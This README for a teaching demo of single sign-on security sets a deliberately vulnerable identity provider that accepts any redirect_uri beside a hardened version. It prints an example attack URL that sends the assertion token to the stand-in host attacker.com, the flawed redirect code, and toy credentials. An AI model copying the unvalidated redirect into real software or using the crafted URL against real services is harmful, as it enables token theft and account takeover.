# SSO — WorkHub + CorpID

Single Sign-On lets users access multiple applications through one central login. WorkHub is the Service Provider (SP); CorpID is the Identity Provider (IdP). This demo shows how an SP delegates authentication to an IdP and receives an assertion token to create a local session.

---

## Port Reference

| Port | File | Role |
|------|------|------|
| 3064 | `sso-server.js` | Vulnerable — unvalidated redirect_uri |
| 3065 | `guide-server.js` | Concept guide |
| 3066 | `sso-strong-server.js` | Hardened — exact allowlist + state validation |

---

## How It Works

```
1. User visits WorkHub (SP) at localhost:3064
2. WorkHub redirects to CorpID (IdP):
     /idp/login?client_id=workhub-client-id
               &redirect_uri=http://localhost:3064/callback
               &state=<random>
3. User logs in at CorpID with their IdP credentials
4. CorpID issues assertion JWT, redirects to redirect_uri:
     http://localhost:3064/callback?token=<assertion>&state=<state>
5. WorkHub validates state + assertion → creates SP session
6. User lands on WorkHub dashboard — authenticated
```

---

## The Vulnerability

The IdP on port 3064 accepts any `redirect_uri`. An attacker crafts a login URL that sends the assertion token to their server instead of WorkHub:

```
ATTACK URL (crafted by attacker):
  http://localhost:3064/idp/login?client_id=workhub-client-id
                                 &redirect_uri=http://attacker.com/steal
                                 &state=x

WHAT HAPPENS:
  1. Victim opens the link — sees legitimate CorpID login page (real IdP, real branding)
  2. Victim enters their real CorpID credentials
  3. CorpID validates credentials — user is authenticated
  4. CorpID redirects to redirect_uri (from the URL, unvalidated):
       http://attacker.com/steal?token=<valid_assertion_JWT>&state=x
  5. Attacker's server receives the assertion JWT
  6. Attacker sends the JWT to WorkHub /callback — creates a session as the victim
  7. Attacker is now logged in as the victim. Victim's actual session is unaffected.
```

The victim saw a real login page, entered real credentials, and was "successfully" logged in. Nothing on screen indicated the token was diverted.

---

## The Fix

On port 3066, `redirect_uri` must be an exact match in the registered allowlist for the `client_id`. Rejection happens at both `/idp/login` (before the form renders) and `/idp/authenticate` (on POST). The `state` parameter is validated on callback to prevent CSRF.

---

## How to Run

```bash
cd auth-concepts/sso
npm install
npm run vulnerable  # terminal 1 → localhost:3064
npm run guide       # terminal 2 → localhost:3065
npm run secure      # terminal 3 → localhost:3066
```

---

## Demo Walkthrough

1. Open **localhost:3064** — redirected to CorpID, login as `alice@corp.com` / `pass1234`
2. Land on WorkHub dashboard with SSO badge — name and email embedded via SSR
3. Click **Sign Out** — SP session cleared; visit again and notice instant re-login (IdP session still active)
4. Paste the attack URL from the amber banner — see `redirect_uri` pointing at `attacker.com`
5. Open **localhost:3065** — read flow diagrams; note how an unvalidated `redirect_uri` diverts the assertion token

---

## Hardened Demo

1. Open **localhost:3066** — copy the attack URL from the amber banner on **3064**
2. Change `localhost:3064` to `localhost:3066` in the URL — attempt the attack on the hardened server
3. Response: `400 Bad Request — redirect_uri not in allowlist` — form never renders
4. Login normally at **3066** — observe `state` parameter in the authorize URL
5. Try `/callback?token=fake&state=wrong` — state mismatch rejected

---

## Vulnerable Lines

```js
// ⚠️ VULNERABLE — no redirect_uri allowlist; any URL accepted as callback target
const REGISTERED_SPS = {
  workhub: { name: 'WorkHub', clientId: 'workhub-client-id' },
  // allowedRedirectUris is absent — no validation performed
};

// In POST /idp/authenticate:
// ⚠️ VULNERABLE — redirectUri comes from the request body (passed through hidden form field)
// and is used directly without any allowlist check
res.redirect(`${redirectUri}?token=${assertionToken}&state=${state}`);
```

---

## Defense Details

### Exact allowlist matching

Prefix matching (`startsWith`) is insufficient: `http://localhost:3066.attacker.com/` starts with `http://localhost:3066`. Only exact string equality against a registered list of callback URLs is safe.

### Double validation

Check at `/idp/login` (before rendering the form) AND at `POST /idp/authenticate` (before issuing the redirect). The first check prevents the login page from being used as a phishing scaffold. The second check is the security guarantee — even if an attacker bypasses the UI, the POST handler still rejects invalid URIs.

### State parameter

Even with an allowlist, `state` prevents CSRF. The allowlist protects where the token goes; `state` protects who initiates the flow. WorkHub generates a random `state`, stores it, and verifies it on callback — a forged redirect cannot complete without the matching value.

---

## Credentials

| Email | Password | Role |
|-------|----------|------|
| alice@corp.com | pass1234 | employee |
| bob@corp.com | qwerty123 | employee |
| admin@corp.com | admin456 | admin |
